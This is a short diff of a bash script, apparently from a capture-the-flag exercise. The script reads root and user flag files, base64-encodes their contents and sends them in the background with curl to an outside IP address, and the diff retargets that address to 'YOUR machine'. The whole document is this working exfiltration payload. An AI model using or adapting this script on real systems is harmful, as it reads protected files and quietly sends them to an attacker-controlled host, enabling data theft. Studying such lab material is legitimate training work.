@@ -1,4 +1,7 @@
 #!/bin/bash
+# Read the flags
 FLAG=$(cat /root/root_flag.txt 2>/dev/null)
 UFLAG=$(cat ~/user_flag.txt 2>/dev/null)
-curl -s "http://10.11.5.221:8084/?flag=$(echo "ROOT:$FLAG|USER:$UFLAG" | base64 -w0)" &
+
+# Send the data to YOUR machine (10.11.2.104)
+curl -s "http://10.11.2.104:8888/?flag=$(echo "ROOT:$FLAG|USER:$UFLAG" | base64 -w0)" &
